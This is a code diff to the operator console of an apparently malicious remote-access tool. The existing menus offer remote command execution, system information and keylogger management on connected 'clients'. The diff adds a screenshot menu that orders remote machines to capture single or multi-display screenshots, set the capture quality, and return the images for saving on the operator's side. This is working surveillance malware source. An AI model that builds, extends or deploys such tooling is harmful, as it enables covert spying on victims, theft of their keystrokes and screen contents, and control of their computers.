@@ -152,7 +152,8 @@ class Controller:
             print("6. ⚡Execute command")
             print("7. 💻 Get system info")
             print("8. ⌨️  Keylogger Management")
-            print("9. 🔙 Back to main menu")
+            print("9. 📸 Screenshot Management")
+            print("10. 🔙 Back to main menu")
             
             
             choice = input("\nSelect option(1-8): ").strip()
@@ -174,6 +175,8 @@ class Controller:
             elif choice == "8":
                 self.keylogger_management_menu(client_id)
             elif choice == "9":
+                self.screenshot_management_menu(client_id)
+            elif choice == "10":
                 break
             else:
                 print("[-] Invalid option")
@@ -623,6 +626,100 @@ class Controller:
                 
         except Exception as e:
             print(f"[-] Error fetching keylogs: {e}")
+            
+    def screenshot_management_menu(self, client_id):
+        while True:
+            print("\n" + "="*50)
+            print(f"SCREENSHOT MANAGEMENT - Client: {client_id}")
+            print("="*50)
+            print("1. 📷 Take Single Screenshot")
+            print("2. 🖥️ Take Multi-Display Screenshot")
+            print("3. ⚙️ Configure Screenshot Quality")
+            print("4. 🔙 Back to process menu")
+            
+            choice = input("\nSelect option(1-4): ").strip()
+            
+            if choice == "1":
+                self.handle_take_screenshot(client_id, multi=False)
+            elif choice == "2":
+                self.handle_take_screenshot(client_id, multi=True)
+            elif choice == "3":
+                self.handle_screenshot_config(client_id)
+            elif choice == "4":
+                break
+            else:
+                print("[-] Invalid option")
+    
+    def handle_take_screenshot(self, client_id, multi=False):
+        """Prendre un screenshot"""
+        quality = input("Quality (30-95, default=65): ").strip()
+        quality = int(quality) if quality.isdigit() else 65
+        
+        action = "take_screenshot"
+        data = {
+            "quality": quality,
+            "multi_display": multi
+        }
+        
+        print(f"\n[+] Taking {'multi-display ' if multi else ''}screenshot...")
+        result = self.send_process_command(client_id, action, data)
+        
+        if result and result.get('success'):
+            print(f"[+] Screenshot captured successfully!")
+            print(f"    Size: {result.get('width', 'N/A')}x{result.get('height', 'N/A')}")
+            print(f"    File size: {result.get('size_kb', 'N/A')}KB")
+            print(f"    Quality: {result.get('quality', 'N/A')}")
+            
+            # Option pour sauvegarder l'image
+            save = input("Save screenshot to file? (y/n): ").strip().lower()
+            if save == 'y':
+                self.save_screenshot_to_file(result, client_id)
+        else:
+            error = result.get('error', 'Unknown error') if result else 'No response'
+            print(f"[-]Screenshot failed: {error}")
+    
+    def handle_screenshot_config(self, client_id):
+        """Configurer les paramètres screenshot"""
+        print("\n[+] Configure screenshot settings:")
+        quality = input("Quality (30-95): ").strip()
+        max_width = input("Max width (pixels): ").strip()
+        
+        data = {}
+        if quality.isdigit():
+            data['quality'] = int(quality)
+        if max_width.isdigit():
+            data['max_width'] = int(max_width)
+        
+        if data:
+            result = self.send_process_command(client_id, "screenshot_config", data)
+            if result and result.get('success'):
+                print("[+] Screenshot configuration updated")
+                print(f"    Quality: {result.get('quality', 'N/A')}")
+                print(f"    Max width: {result.get('max_width', 'N/A')}")
+            else:
+                error = result.get('error', 'Unknown error') if result else 'No response'
+                print(f"[-] Configuration failed: {error}")
+        else:
+            print("[-] No valid configuration provided")
+    
+    def save_screenshot_to_file(self, screenshot_data, client_id):
+        """Sauvegarder le screenshot dans un fichier"""
+        try:
+            import base64
+            from datetime import datetime
+            
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            filename = f"screenshot_{client_id}_{timestamp}.jpg"
+            
+            image_data = screenshot_data.get('data')
+            if image_data:
+                with open(filename, 'wb') as f:
+                    f.write(base64.b64decode(image_data))
+                print(f"[+] Screenshot saved as: {filename}")
+            else:
+                print("[-] No image data to save")
+        except Exception as e:
+            print(f"[-] Error saving screenshot: {e}")
         
         
 if __name__ == "__main__":
